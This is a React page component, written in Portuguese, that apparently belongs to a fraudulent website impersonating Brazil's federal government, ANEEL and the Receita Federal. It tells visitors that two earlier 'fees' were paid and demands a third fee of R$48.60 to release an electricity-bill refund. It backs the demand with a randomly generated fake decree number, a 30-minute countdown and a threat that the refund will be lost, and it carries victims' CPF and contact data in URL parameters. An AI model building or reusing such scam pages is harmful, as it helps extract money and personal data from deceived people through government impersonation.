import { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardFooter, CardHeader, CardTitle } from "@/components/ui/card";
import { AlertTriangle, Copy, Check, CreditCard, Clock, FileText, CheckCircle2, XCircle, ArrowRight } from "lucide-react";
import { useLocation } from "wouter";
import Header from "@/components/Header";
import Footer from "@/components/Footer";
import { Separator } from "@/components/ui/separator";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { LoadingPopup } from "@/components/LoadingPopup";

const formatarCPF = (cpf: string) => {
  return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
};

const formatarMoeda = (valor: number | string) => {
  const valorNumerico = typeof valor === 'string' ? parseFloat(valor) : valor;
  return valorNumerico.toLocaleString('pt-BR', {
    style: 'currency',
    currency: 'BRL',
  });
};

export default function TaxaFinal() {
  const [location, setLocation] = useLocation();
  const { toast } = useToast();
  const [isLoading, setIsLoading] = useState(false);
  const [decreto, setDecreto] = useState("");
  
  // Estados para armazenar dados da solicitação
  const [dadosSolicitacao, setDadosSolicitacao] = useState({
    nome: "",
    cpf: "",
    email: "",
    telefone: "",
    valor: "0",
    companhia: "",
    estado: "",
    dataNascimento: "",
    pagamentoId: ""
  });
  const [copiado, setCopiado] = useState(false);
  const [temporizador, setTemporizador] = useState(30); // Temporizador de 30 minutos
  const [tempoFormatado, setTempoFormatado] = useState("30:00");

  // Função para copiar o decreto
  const copiarDecreto = () => {
    navigator.clipboard.writeText(decreto).then(() => {
      setCopiado(true);
      toast({
        title: "Número copiado!",
        description: "O número do decreto foi copiado para a área de transferência."
      });
      setTimeout(() => setCopiado(false), 2000);
    });
  };

  useEffect(() => {
    // Gerar decreto aleatório
    const gerarDecreto = () => {
      const ano = new Date().getFullYear();
      const numero = Math.floor(Math.random() * 9000) + 1000;
      return `${numero}/${ano}`;
    };

    setDecreto(gerarDecreto());

    // Recuperar dados da URL
    const params = new URLSearchParams(window.location.search);
    
    // Verificar se temos os parâmetros necessários
    if (!params.get('cpf') || !params.get('nome') || !params.get('valor')) {
      // Redirecionar para a página inicial se não tivermos os dados necessários
      setLocation("/");
      return;
    }
    
    // Organizar todos os dados da solicitação
    const dadosCompletos = {
      nome: params.get('nome') || "",
      cpf: params.get('cpf') || "",
      email: params.get('email') || "",
      telefone: params.get('telefone') || "",
      valor: params.get('valor') || "0",
      companhia: params.get('companhia') || "CEMIG Distribuição",
      estado: params.get('estado') || "Minas Gerais",
      dataNascimento: params.get('nasc') || "21/07/2003",
      pagamentoId: params.get('pagamentoId') || ""
    };

    // Atualizar estado
    setDadosSolicitacao(dadosCompletos);

    // Iniciar o temporizador
    const intervalo = setInterval(() => {
      setTemporizador((prev) => {
        if (prev <= 1) {
          clearInterval(intervalo);
          return 0;
        }
        return prev - 1;
      });
    }, 60000); // Atualiza a cada minuto

    // Limpar o intervalo quando o componente desmontar
    return () => clearInterval(intervalo);
  }, [setLocation]);

  // Atualizar o tempo formatado quando o temporizador mudar
  useEffect(() => {
    setTempoFormatado(`${temporizador}:00`);
  }, [temporizador]);

  // Função para simular pagamento da taxa final
  const pagarTaxaFinal = () => {
    setIsLoading(true);
    
    // Parâmetros para a próxima página
    const params = new URLSearchParams(window.location.search);
    
    // Adicionar informação de que a TEDF foi paga
    params.set('tedf_pago', 'true');
    
    // Simular processamento de pagamento
    setTimeout(() => {
      setIsLoading(false);
      // Redirecionar para a página de sucesso
      window.location.href = `/sucesso?${params.toString()}`;
    }, 2500);
  };

  return (
    <>
      <Header />
      {isLoading && (
        <LoadingPopup
          message="Processando seu pagamento"
          subMessage="Por favor, aguarde enquanto confirmamos sua transação..."
        />
      )}
      <main className="bg-[var(--gov-gray-light)] min-h-screen py-10">
        <div className="container max-w-4xl mx-auto px-4">
          <div className="bg-white p-6 rounded-lg shadow-md">
            <div className="border-l-4 border-green-500 bg-green-50 p-4 mb-6">
              <div className="flex">
                <div className="flex-shrink-0">
                  <CheckCircle2 className="h-5 w-5 text-green-500" />
                </div>
                <div className="ml-3">
                  <h3 className="text-sm font-medium text-green-800">
                    TAXA DE CONFORMIDADE NACIONAL (TCN) CONFIRMADA
                  </h3>
                  <div className="mt-2 text-sm text-green-700">
                    <p>GOVERNO FEDERAL – ANEEL & RECEITA FEDERAL</p>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex flex-col items-center justify-center text-center space-y-4 mb-8">
              <h1 className="text-2xl md:text-3xl font-bold text-[var(--gov-blue-dark)]">
                ETAPA FINAL DE LIBERAÇÃO DO SEU CRÉDITO
              </h1>
              <p className="text-[var(--gov-gray-dark)] max-w-xl">
                Seu pagamento da Taxa de Conformidade Nacional (TCN) no valor de {formatarMoeda(118.00)} foi confirmado com sucesso. Falta apenas a última etapa para a liberação do seu crédito.
              </p>
            </div>

            <div className="mb-8 bg-blue-50 p-6 rounded-lg border border-blue-200">
              <h2 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4">
                Etapa Final para Liberação do Valor
              </h2>
              <p className="text-[var(--gov-gray-dark)] mb-4">
                Para concluir o processo e garantir que o valor seja depositado em sua conta, é necessário finalizar a última etapa conforme previsto no Decreto Complementar nº {decreto}.
              </p>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-6 mb-6">
                <Card className="border-green-300 shadow-sm">
                  <CardHeader className="bg-green-50 border-b border-green-200">
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-green-800 flex items-center gap-2 text-base">
                        <div className="rounded-full h-6 w-6 bg-green-500 text-white flex items-center justify-center text-sm font-bold">1</div> 
                        Taxa de Regularização Energética (TRE)
                      </CardTitle>
                      <Badge variant="outline" className="bg-green-100 text-green-800 border-green-300">
                        CONFIRMADO
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4 pt-6">
                    <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Valor:</span>
                      <span className="font-bold text-green-600">{formatarMoeda(74.90)}</span>
                    </div>
                    <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Status:</span>
                      <span className="text-green-600 font-medium">Pago</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Data:</span>
                      <span className="text-[var(--gov-gray-dark)] text-sm">{new Date().toLocaleDateString()}</span>
                    </div>
                  </CardContent>
                </Card>

                <Card className="border-green-300 shadow-sm">
                  <CardHeader className="bg-green-50 border-b border-green-200">
                    <div className="flex items-center justify-between">
                      <CardTitle className="text-green-800 flex items-center gap-2 text-base">
                        <div className="rounded-full h-6 w-6 bg-green-500 text-white flex items-center justify-center text-sm font-bold">2</div> 
                        Taxa de Conformidade Nacional (TCN)
                      </CardTitle>
                      <Badge variant="outline" className="bg-green-100 text-green-800 border-green-300">
                        CONFIRMADO
                      </Badge>
                    </div>
                  </CardHeader>
                  <CardContent className="space-y-4 pt-6">
                    <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Valor:</span>
                      <span className="font-bold text-green-600">{formatarMoeda(118.00)}</span>
                    </div>
                    <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Status:</span>
                      <span className="text-green-600 font-medium">Pago</span>
                    </div>
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-[var(--gov-gray-dark)]">Data:</span>
                      <span className="text-[var(--gov-gray-dark)] text-sm">{new Date().toLocaleDateString()}</span>
                    </div>
                  </CardContent>
                </Card>
              </div>
              
              <Card className="border-yellow-300 shadow-sm">
                <CardHeader className="bg-yellow-50 border-b border-yellow-200">
                  <div className="flex items-center justify-between">
                    <CardTitle className="text-yellow-800 flex items-center gap-2 text-base">
                      <div className="rounded-full h-6 w-6 bg-yellow-500 text-white flex items-center justify-center text-sm font-bold">3</div> 
                      3ª ETAPA – Taxa de Emissão de Documento Final (TEDF)
                    </CardTitle>
                    <Badge variant="outline" className="bg-yellow-100 text-yellow-800 border-yellow-300">
                      PENDENTE
                    </Badge>
                  </div>
                </CardHeader>
                <CardContent className="space-y-4 pt-6">
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Valor:</span>
                    <span className="font-bold text-[var(--gov-blue-dark)]">{formatarMoeda(48.60)}</span>
                  </div>
                  <div className="flex justify-between items-center border-b border-gray-100 pb-4">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Prazo:</span>
                    <div className="flex items-center gap-2">
                      <Clock className="h-4 w-4 text-red-500" />
                      <span className="text-red-600 font-medium">{tempoFormatado} minutos</span>
                    </div>
                  </div>
                  <div className="flex justify-between items-center">
                    <span className="text-sm text-[var(--gov-gray-dark)]">Objetivo:</span>
                    <span className="text-[var(--gov-gray-dark)] text-sm">Geração do código único de liquidação digital</span>
                  </div>
                </CardContent>
              </Card>
              
              <div className="bg-gray-50 p-4 rounded-lg border border-gray-200 mt-6 mb-6">
                <h3 className="font-semibold text-[var(--gov-blue-dark)] mb-2">STATUS ATUAL:</h3>
                <div className="space-y-2">
                  <div className="flex items-center">
                    <CheckCircle2 className="h-5 w-5 text-green-600 mr-2" />
                    <span className="text-green-700">TRE paga</span>
                  </div>
                  <div className="flex items-center">
                    <CheckCircle2 className="h-5 w-5 text-green-600 mr-2" />
                    <span className="text-green-700">TCN paga</span>
                  </div>
                  <div className="flex items-center">
                    <Clock className="h-5 w-5 text-yellow-600 mr-2" />
                    <span className="text-yellow-700">Aguardando TEDF (última etapa)</span>
                  </div>
                </div>
              </div>
              
              <div className="border-l-4 border-red-500 bg-red-50 p-4 mb-6">
                <div className="flex">
                  <div className="flex-shrink-0">
                    <AlertTriangle className="h-5 w-5 text-red-500" />
                  </div>
                  <div className="ml-3">
                    <h3 className="text-sm font-medium text-red-800">
                      ATENÇÃO:
                    </h3>
                    <div className="mt-2 text-sm text-red-700">
                      <p>Caso a etapa final não seja concluída em até 30 minutos, o processo será encerrado automaticamente e o valor destinado à restituição retornará ao fundo de compensação tarifária nacional, sem possibilidade de novo pedido em 2025.</p>
                    </div>
                  </div>
                </div>
              </div>
            </div>

            <div className="flex flex-col items-center">
              <Button 
                className="w-full max-w-md bg-green-600 hover:bg-green-700 text-white font-bold py-6 text-lg mb-4"
                onClick={pagarTaxaFinal}
              >
                <CreditCard className="mr-2 h-5 w-5" />
                EFETUAR PAGAMENTO FINAL E LIBERAR CRÉDITO
              </Button>
              <p className="text-center text-sm text-gray-500 max-w-md">
                Efetue agora a quitação da TEDF no valor de {formatarMoeda(48.60)} para concluir o processo de restituição e garantir que seu valor seja liberado imediatamente em sua conta bancária.
              </p>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}